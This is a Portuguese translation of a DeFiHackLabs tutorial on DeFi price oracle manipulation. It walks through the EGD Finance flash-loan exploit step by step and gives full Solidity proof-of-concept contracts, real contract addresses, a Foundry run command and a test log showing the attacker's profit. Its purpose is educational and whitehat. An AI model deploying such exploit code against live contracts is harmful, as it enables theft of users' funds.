# Depuração de Transações OnChain: 3. Escreva sua própria PoC (Manipulação de Oráculo de Preços)

Autor: [▓▓▓▓▓▓](https://twitter.com/h0wsO1)

Tradução: [Simon](https://www.linkedin.com/in/tysliu/) e [Helen](https://www.linkedin.com/in/helen-l-25b7a41a8/)

No [01_Tools](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/01_tools/en), aprendemos como usar várias ferramentas para analisar transações em contratos inteligentes.

No [02_Warm](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/academy/onchain_debug/02_warmup/en/readme.md), analisamos uma transação em uma exchange descentralizada usando o Foundry.

Para esta publicação, analisaremos um incidente de hacker utilizando uma exploração de oráculo. Vamos guiá-lo passo a passo pelas principais chamadas de função e, em seguida, reproduziremos o ataque juntos usando o framework Foundry.


## Por que a Reprodução de Ataques é Útil?

Na DeFiHackLabs, pretendemos promover a segurança da Web3. Esperamos que, quando ocorram ataques, mais pessoas possam analisar e contribuir para a segurança geral.

1. Como vítimas infelizes, melhoramos nossa resposta a incidentes e eficácia.
2. Como whitehat, melhoramos nossa capacidade de escrever PoCs e obter recompensas por bugs.
3. Ajudar a equipe de defesa a ajustar modelos de aprendizado de máquina. Por exemplo, [Forta Network](https://forta.org/blog/how-fortas-predictive-ml-models-detect-attacks-before-exploitation/).
4. Você aprenderá muito mais reproduzindo o ataque em comparação com a leitura de relatórios pós-mortem.
5. Melhore seu "Kung Fu" geral em Solidity.

### Alguns Pontos Importantes Antes de Reproduzir Transações

1. Compreensão dos modos de ataque comuns. Que foram selecionados em [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs).
2. Compreensão dos mecanismos básicos de DeFi, incluindo como os contratos inteligentes interagem entre si.

### Introdução ao Oráculo DeFi

Atualmente, os valores de contratos inteligentes, como preços e configurações, não podem se atualizar automaticamente. Para executar sua lógica de contrato, às vezes é necessário dados externos durante a execução. Isso é normalmente feito com os seguintes métodos.

1. Através de contas de propriedade externas. Podemos calcular o preço com base nas reservas dessas contas.
2. Usar um oráculo, que é mantido por alguém ou até mesmo por você mesmo. Com dados externos atualizados periodicamente, como preço, taxa de juros, qualquer coisa.

* Por exemplo, no Uniswap V2, eles fornecem o preço atual do ativo, que é usado para determinar o valor relativo do ativo sendo negociado e, assim, executar a negociação.

  * Seguindo a figura, o preço do ETH é o dado externo. O contrato inteligente o obtém do Uniswap V2.

    Conhecemos a fórmula `x * y = k` em um AMM típico. `x` (preço do ETH neste caso) = `k / y`.

    Portanto, vamos dar uma olhada no contrato de par de negociação Uniswap V2 WETH/USDC. Neste endereço `0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc`.

![UniV2PairInfo](https://user-images.githubusercontent.com/26408530/211231355-0d1fb43e-280e-4328-b71e-9797be5ce7ec.png)

* No momento da publicação, vemos os seguintes valores de reserva:

  * WETH: `33,906.6145928`  USDC: `42,346,768.252804` 

  * Fórmula: Aplicando a fórmula `x * y = k`, obteremos o preço para cada ETH:

     `42,346,768.252804 / 33,906.6145928 = 1248.9235`
     
   (Os preços de mercado podem diferir do preço calculado por alguns centavos. Na maioria dos casos, isso se refere a uma taxa de negociação ou a uma nova transação que afeta o pool. Essa variação pode ser corrigida com `skim()`[^1].)

  * Pseudocódigo Solidity: Para o contrato de empréstimo buscar o preço atual do ETH, o pseudocódigo pode ser o seguinte:

```solidity=
uint256 UniV2_ETH_Reserve = WETH.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 UniV2_USDC_Reserve = USDC.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 ETH_Price = UniV2_USDC_Reserve / UniV2_ETH_Reserve;
```
   > #### Observe que esse método de obtenção de preço é facilmente manipulável. Por favor, não o use no código de produção.

[^1]: Skim() :
O Uniswap V2 é uma exchange descentralizada (DEX) que usa um pool de liquidez para negociar ativos. Ele possui uma função `skim()` como medida de segurança para proteger contra possíveis problemas de implementações de tokens personalizados que podem alterar o saldo do contrato de par. No entanto, `skim()` também pode ser usado em conjunto com manipulação de preço.
Consulte a figura para uma explicação completa do `skim()`.
![截圖 2023-01-11 下午5 08 07](https://user-images.githubusercontent.com/107821372/211970534-67370756-d99e-4411-9a49-f8476a84bef1.png)
Fonte da imagem / [Whitepaper do Uniswap V2 Core](https://uniswap.org/whitepaper.pdf)

* Para mais informações, você pode seguir os recursos abaixo
  * Mecanismos AMM do Uniswap V2: [Smart Contract Programmer](https://www.youtube.com/watch?v=Ar4Ik7Bov0U).
  * Manipulação de oráculo: [WTFSolidity](https://github.com/WTFAcademy/WTF-Solidity/blob/main/S15_OracleManipulation/readme.md).

### Modos de Ataque de Manipulação de Preço do Oráculo

Modos de ataque mais comuns:

1. Alterar o endereço do oráculo
    * Causa raiz: falta de mecanismo de verificação
    * Por exemplo: [Rikkei Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220415-rikkei-finance---access-control--price-oracle-manipulation)
2. Através de empréstimos relâmpago, um atacante pode drenar a liquidez, resultando em informações de preço incorretas em um oráculo.
    * Isso é mais comumente visto em chamadas de funções como GetPrice, Swap, StackingReward, Transfer (com taxa de queima), etc.
    * Causa raiz: Protocolos que usam oráculos inseguros/comprometidos ou o oráculo não implementou recursos de preço médio ponderado pelo tempo.
    * Exemplo: [One Ring Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220321-onering-finance---flashloan--price-oracle-manipulation)

    > Dica de especialista - caso 2: Durante a revisão de código, verifique se a função `balanceOf()` está bem protegida.
---
## PoC passo a passo - Um exemplo do EGD Finance

### Passo 1: Coleta de informações

* Ao descobrir um ataque, o Twitter geralmente é a linha de frente das consequências. Os principais analistas de DeFi publicarão continuamente suas novas descobertas lá.

> Dica: Junte-se ao canal de alerta de segurança do [DeFiHackLabs Discord](https://discord.gg/Fjyngakf3h) para receber atualizações selecionadas dos principais analistas de DeFi!

* Após um incidente de ataque, é importante coletar e organizar as informações mais recentes. Aqui está um modelo!
  1. ID da transação
  2. Endereço do atacante (EOA)
  3. Endereço do contrato de ataque
  4. Endereço vulnerável
  5. Perda total
  6. Links de referência
  7. Links pós-mortem
  8. Trecho vulnerável
  9. Histórico de auditoria

> Dica: Use o modelo [Exploit-Template.sol](/script/Exploit-template.sol) do DeFiHackLabs.
---
### Passo 2: Depuração da transação

Com base na experiência, 12 horas após o ataque, 90% da autópsia do ataque já terá sido concluída. Geralmente não é muito difícil analisar o ataque nesse ponto.

* Usaremos um caso real de [ataque de exploração do EGD Finance](https://twitter.com/BlockSecTeam/status/1556483435388350464) como exemplo, para ajudá-lo a entender:
  1. o risco na manipulação de oráculos.
  2. como lucrar com a manipulação de oráculos.
  3. transação de empréstimo relâmpago.
  4. como os atacantes reproduzem o ataque com apenas 1 transação para realizar o ataque.

* Vamos usar o [Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3) do Blocksec para analisar o incidente do EGD Finance.
<img width="1644" alt="Screenshot 2023-01-11 at 4 59 15 PM" src="https://user-images.githubusercontent.com/107821372/211762771-d2c54800-4595-4630-9392-30431094bfca.png">

* No Ethereum EVM, você verá 3 tipos de chamadas para acionar funções remotas:
  1. Call: Chamada de função típica entre contratos, geralmente alterará o armazenamento do receptor.
  2. StaticCall: Não alterará o armazenamento do receptor, usado para buscar estado e variáveis.
  3. DelegateCall: `msg.sender` permanecerá o mesmo, geralmente usado para chamadas de proxy. Consulte [WTF Solidity](https://github.com/WTFAcademy/WTF-Solidity/tree/main/23_Delegatecall) para mais detalhes.

> Observe que as chamadas de função internas[^2] não são visíveis no Ethereum EVM.
[^2]: Chamadas de função internas são invisíveis para o blockchain, pois não criam novas transações ou blocos. Dessa forma, elas não podem ser lidas por outros contratos inteligentes ou aparecer no histórico de transações do blockchain.
* Mais informações - Modo de ataque de empréstimo relâmpago do atacante
  1. Verifique se o ataque será lucrativo. Primeiro, verifique se os empréstimos podem ser obtidos e, em seguida, verifique se o alvo tem saldo suficiente.
     - Isso significa que você verá algumas chamadas 'static' no início.
  2. Use DEX ou Protocolos de Empréstimo para obter um empréstimo relâmpago, procure as seguintes chamadas de função principais
     - UniswapV2, Pancakeswap: `.swap()`
     - Balancer: `flashLoan()`
     - DODO: `.flashloan()`
     - AAVE: `.flashLoan()`
  3. Callbacks do protocolo de empréstimo relâmpago para o contrato do atacante, procure as seguintes chamadas de função principais
        - UniswapV2: `.uniswapV2Call()`
        - Pancakeswap: `.Pancakeswap()`
        - Balancer: `.receiveFlashLoan()`
        - DODO: `.DXXFlashLoanCall()`
        - AAVE: `.executeOperation()`
   4. Execute o ataque para lucrar com a fraqueza do contrato.
   5. Devolva o empréstimo relâmpago

### Prática:

Identifique as várias etapas do ataque de exploração do EGD Finance em [Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3). Mais especificamente, 'flashloan', 'callback', 'weakness' e 'profit'.

`Expandir Nível: 3`
<img width="1898" alt="TryToDecodeFromYourEyes" src="https://user-images.githubusercontent.com/26408530/211231441-b5cd2cd8-a438-4344-b014-6b8e92ab2532.png">

> Dica: Se você não conseguir entender a lógica das chamadas de função individuais, tente rastrear toda a pilha de chamadas sequencialmente, faça anotações e preste atenção especial no rastro do dinheiro. Você terá uma compreensão muito melhor depois de fazer isso algumas vezes.
<details><summary>A resposta</summary>

<img width="1589" alt="Screenshot 2023-01-12 at 1 58 02 PM" src="https://user-images.githubusercontent.com/107821372/211996295-063f4c64-957a-4896-8736-c4dbbc082272.png">

</details>


### Passo 3: Reproduzir o código
Após a análise das chamadas de função da transação de ataque, vamos agora tentar reproduzir algum código:

#### Passo A. Completar os fixtures.

<details><summary>Clique para mostrar o código</summary>
 
```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// Declaring a global variable must be of constant type.
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() { // can also be replaced with ‘function setUp() public {}
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command."
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //Note: The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
}
```
</details>
<br>

#### Passo B. Simular um atacante chamando a função harvest
<details><summary>Clique para mostrar o código</summary>

```solidity=
contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() {
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command.
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
 
    function testExploit() public { // To be executed by Foundry testcases, it must be named "test" at the start.
        //To observe the changes in the balance, print out the balance first, before attacking.
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        
        console.log("Attacker manipulating price oracle of EGD Finance...");
        exploit.harvest(); //A simulation of an EOA call attack
        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
}
```
</details>
<br>

#### Passo C. Completar parte do contrato de ataque
<details><summary>Clique para mostrar o código</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;

    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Profit realization
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        // Weakness exploit...

        // Exchange the stolen EGD Token for USDT
        console.log("Swap the profit...");
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee
        require(suc, "Flashloan[1] payback failed");
    }
}
```

</details>
<br>


### Passo 4: Analisando a exploração

Vemos aqui que o atacante chamou a função `Pancakeswap.swap()` para aproveitar a exploração, parece que há uma segunda chamada de empréstimo relâmpago na pilha de chamadas.
![Flashloan2](https://user-images.githubusercontent.com/26408530/211231489-4977bc1d-4ed0-45f8-b014-8de92942fe4f.png)

* O Pancakeswap usa a interface `.pancakeCall()` para realizar uma chamada de retorno no contrato do atacante. Você pode estar se perguntando como o atacante está executando códigos diferentes durante cada uma das duas chamadas de retorno.

A chave está no primeiro empréstimo relâmpago, o atacante usou `0x0000` nos dados de retorno.
![FlashloanCallbackData1](https://user-images.githubusercontent.com/26408530/211231501-7b8e508a-a6fe-4f28-9308-5406d0dec32f.png)

No entanto, durante o segundo empréstimo relâmpago, o atacante usou `0x00` nos dados de retorno.
![FlashloanCallbackData2](https://user-images.githubusercontent.com/26408530/211231506-e76cc110-3969-486d-b917-7ddec3d46ee5.png)


Através desse método, um contrato de ataque pode determinar qual código executar com base no parâmetro `_data`. Que pode ser 0x0000 ou 0x00.

* Vamos continuar analisando a lógica da segunda chamada de retorno durante o segundo empréstimo relâmpago.

Durante a segunda chamada de retorno, o atacante chamou apenas `claimAllReward()` do EGD Finance:

![CallClaimReward](https://user-images.githubusercontent.com/26408530/211231522-a54ef929-63e3-4b9c-8f0c-e609c2055b2c.png)

Expandindo ainda mais a chamada de função `claimAllReward()`. Você encontrará o EGD Finance realizando uma leitura em `0xa361-Cake-LP` para o saldo do EGD Token e USDT, em seguida, transferindo uma grande quantidade de EGD Token para o contrato do atacante.

![ClaimRewardDetail](https://user-images.githubusercontent.com/26408530/211231532-d9b0e7ce-ee65-48fb-a2eb-6fccbb799234.png)

<details><summary>O que é o contrato '0xa361-Cake-LP'?</summary>

Usando o Etherscan, podemos ver a que par de negociação `0xa361-Cake-LP` corresponde.

* Opção 1 (mais rápida): Veja os dois maiores tokens de reserva do contrato em [Etherscan](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d) 

![Etherscan-Top2](https://user-images.githubusercontent.com/26408530/211231654-613672c0-400d-4e53-891c-4c309d8ce84c.png)
* Opção 2 (mais precisa): [Leia o contrato](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#readContract) Verifique o endereço do token0 e token1.

<img width="404" alt="Etherscan-ReadContract" src="https://user-images.githubusercontent.com/26408530/211231545-43777f4e-6433-4dba-b2dc-ab54cd7aaeed.png">

Isso indica que `0xa361-Cake-LP` é o contrato de par de negociação EGD/USDT.

</details>
<br>

* Vamos analisar a função `claimAllReward()` para ver onde está a exploração.
<img width="1518" alt="ClaimRewardCode" src="https://user-images.githubusercontent.com/26408530/211231553-770e01d9-d809-43e1-99df-8674b0b30c8c.png">

Vemos que a quantidade de recompensa de Staking é baseada no fator de recompensa `quota` (ou seja, a quantidade de staking e a duração do staking) multiplicada por `getEGDPrice()` o preço atual do token EGD.

**Em outras palavras, a recompensa de Staking do EGD é baseada no preço do token EGD. Menos recompensa é obtida em um preço alto do token EGD e vice-versa.**

* Agora vamos verificar como a função `getEGDPrice()` obtém o preço atual do token EGD:

<img width="529" alt="getEGDPrice" src="https://user-images.githubusercontent.com/26408530/211231565-596b32d8-cbb9-4f59-a53e-77d837d2766c.png">

Vemos a conhecida equação `x * y = k`, como a que introduzimos anteriormente na seção de introdução ao oráculo DeFi, para obter o preço atual. O endereço do par de negociação é `0xa361-Cake-LP`, que corresponde às duas chamadas STATICCALLs da visualização da transação.

![getEGDPrice_Static](https://user-images.githubusercontent.com/26408530/211231574-bb7a652d-3538-4ca1-859d-a30962014d44.png)

Então, como o atacante está aproveitando esse método inseguro de obter preços atuais?

O mecanismo subjacente é que, a partir do segundo empréstimo relâmpago, o atacante pegou uma grande quantidade de USDT, influenciando assim o preço do pool com base na fórmula `x * y = k`. Antes de devolver o empréstimo, o `getEGDPrice()` estará incorreto.

Diagrama de referência:
![CleanShot 2023-01-12 at 17 01 46@2x](https://user-images.githubusercontent.com/107821372/212027306-3a7f9a8c-4995-472c-a8c7-39e5911b531d.png)
**Conclusão: O atacante usou um empréstimo relâmpago para alterar a liquidez do par de negociação EGD/USDT, resultando em `ClaimReward()` obtendo um preço incorreto, permitindo que o atacante obtenha uma quantidade absurda de tokens EGD.**

Por fim, o atacante trocou o token EGD por USDT usando o Pancakeswap, lucrando assim com o ataque.


---
### Passo 5: Reproduzir
Agora que entendemos completamente o ataque, vamos reproduzi-lo:

Passo D. Escreva o código PoC para o ataque

<details><summary>Clique para mostrar o código</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Profit realization
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // Exchange the stolen EGD Token for USDT after the exploit is over.
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            // Exploitation...
        }


    }
}
```

</details>
<br>



Passo E. Escreva o código PoC para o segundo empréstimo relâmpago usando a exploração

<details><summary>Clique para mostrar o código</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Profit realization
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // Exchange the stolen EGD Token for USDT after the exploit is over.
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            // Exploitation...
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

Passo F. Execute o código com `forge test --contracts ./src/test/EGD-Finance.exp.sol -vvv`. Preste atenção na mudança de saldos.

[DeFiHackLabs - EGD-Finance.exp.sol](https://github.com/finn79426/DeFiHackLabs/blob/main/src/test/EGD-Finance.exp.sol)

```
Running 1 test for src/test/EGD-Finance.exp.sol:Attacker
[PASS] testExploit() (gas: 537204)
Logs:
Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Attacker Stake 10 USDT to EGD Finance
  -------------------------------- Start Exploit ----------------------------------
  [Start] Attacker USDT Balance: 0.000000000000000000
  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
  [INFO] Current earned reward (EGD token): 0.000341874999999972
  Attacker manipulating price oracle of EGD Finance...
  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
  Flashloan[1] received
  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
  Flashloan[2] received
  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
  Claim all EGD Token reward from EGD Finance contract
  [INFO] Get reward (EGD token): 5630136.300267721935770000
  Flashloan[2] payback success
  Swap the profit...
  Flashloan[1] payback success
  -------------------------------- End Exploit ----------------------------------
  [End] Attacker USDT Balance: 18062.915446991996902763

Test result: ok. 1 passed; 0 failed; finished in 1.66s
```


Observação: EGD-Finance.exp.sol do DeFiHackLabs inclui uma etapa preventiva que é o staking.

Esta explicação não inclui essa etapa, sinta-se à vontade para tentar você mesmo! Attacker Stack Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8


#### A terceira parte do compartilhamento terminará aqui, se você deseja aprender mais, confira os links abaixo.

---
### Materiais de aprendizagem

[samczsun's eth txn explorer and vscode extension](https://www.youtube.com/watch?v=HXgu239mPBc)

[Vulnerabilities in DeFi by Daniel V.F.](https://www.youtube.com/watch?v=9fcOffCg2ig)

[Tenderly.co - Debug Transaction](https://www.youtube.com/watch?v=90GN9Ut8LhU)

[Reversing The EVM: Raw Calldata](https://degatchi.com/articles/reading-raw-evm-calldata)

[https://web3sec.xrex.io/](https://web3sec.xrex.io/)

---
### Apêndice

.

